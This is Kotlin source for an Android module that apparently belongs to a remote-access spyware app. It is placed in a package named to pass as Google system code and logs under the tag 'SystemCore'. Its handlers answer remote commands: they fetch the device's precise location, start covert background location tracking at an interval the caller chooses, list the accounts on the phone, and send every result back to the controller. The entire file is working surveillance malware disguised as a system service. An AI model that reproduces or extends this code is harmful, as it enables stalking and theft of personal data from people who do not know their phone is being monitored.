package com.google.android.systemservice.handlers

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.systemservice.services.LocationService
import kotlinx.coroutines.*
import org.json.JSONObject

class LocationHandlers(private val ctx: CommandContext) {
    companion object {
        private const val TAG = "SystemCore"
    }

    private fun sendError(message: String) {
        ctx.sendResponse("error", JSONObject().apply {
            put("error", message)
        })
    }

    @android.annotation.SuppressLint("MissingPermission")
    fun executeGetLocation() {
        ctx.scope.launch {
            try {
                val fusedClient = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(ctx.appContext)
                val result = CompletableDeferred<android.location.Location?>()

                // Try last known location first
                fusedClient.lastLocation.addOnSuccessListener { location ->
                    if (location != null) {
                        result.complete(location)
                    } else {
                        // Request fresh location
                        val request = com.google.android.gms.location.LocationRequest.Builder(
                            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, 1000
                        ).setWaitForAccurateLocation(true).setMaxUpdates(1).build()

                        val callback = object : com.google.android.gms.location.LocationCallback() {
                            override fun onLocationResult(lr: com.google.android.gms.location.LocationResult) {
                                result.complete(lr.lastLocation)
                                fusedClient.removeLocationUpdates(this)
                            }
                        }
                        fusedClient.requestLocationUpdates(request, callback, Looper.getMainLooper())
                    }
                }.addOnFailureListener {
                    result.complete(null)
                }

                val location = withTimeoutOrNull(30000) { result.await() }
                if (location != null) {
                    ctx.sendResponse("location", JSONObject().apply {
                        put("latitude", location.latitude)
                        put("longitude", location.longitude)
                        put("accuracy", location.accuracy)
                        put("altitude", location.altitude)
                        put("speed", location.speed)
                        put("provider", location.provider ?: "unknown")
                        put("timestamp", location.time)
                    })
                } else {
                    sendError("Could not get location (timeout)")
                }
            } catch (e: Exception) {
                sendError("Location error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeStartLocationTracking(params: JSONObject?) {
        val intervalMs = params?.optLong("interval_ms", 60000) ?: 60000
        val intent = Intent(ctx.appContext, LocationService::class.java).apply {
            action = "START_TRACKING"
            putExtra("interval_ms", intervalMs)
        }
        ctx.appContext.startService(intent)
        Log.d(TAG, "Started location tracking with interval: ${intervalMs}ms")
    }

    fun executeStopLocationTracking() {
        val intent = Intent(ctx.appContext, LocationService::class.java).apply {
            action = "STOP_TRACKING"
        }
        ctx.appContext.startService(intent)
        Log.d(TAG, "Stopped location tracking")
    }

    fun executeGetAccounts() {
        ctx.scope.launch {
            try {
                if (ContextCompat.checkSelfPermission(ctx.appContext, android.Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                    ctx.sendResponse("accounts", JSONObject().put("error", "GET_ACCOUNTS permission not granted"))
                    return@launch
                }
                val accountManager = android.accounts.AccountManager.get(ctx.appContext)
                val accounts = accountManager.accounts
                val accountList = org.json.JSONArray()

                for (account in accounts) {
                    accountList.put(JSONObject().apply {
                        put("name", account.name)
                        put("type", account.type)
                    })
                }

                ctx.sendResponse("accounts", JSONObject().put("accounts", accountList))
            } catch (e: Exception) {
                Log.e(TAG, "Error getting accounts: ${(e.message ?: "Unknown error")}")
                ctx.sendResponse("accounts", JSONObject().put("error", (e.message ?: "Unknown error")))
            }
        }
    }

    fun executeToggleWifi() {
        ctx.scope.launch {
            try {
                // Note: Direct WiFi toggle is restricted on Android 10+
                // This will open WiFi settings instead
                val intent = Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.appContext.startActivity(intent)

                ctx.sendResponse("wifi_toggle", JSONObject().put("status", "settings_opened"))
            } catch (e: Exception) {
                Log.e(TAG, "Error toggling WiFi: ${(e.message ?: "Unknown error")}")
                ctx.sendResponse("wifi_toggle", JSONObject().put("error", (e.message ?: "Unknown error")))
            }
        }
    }
}
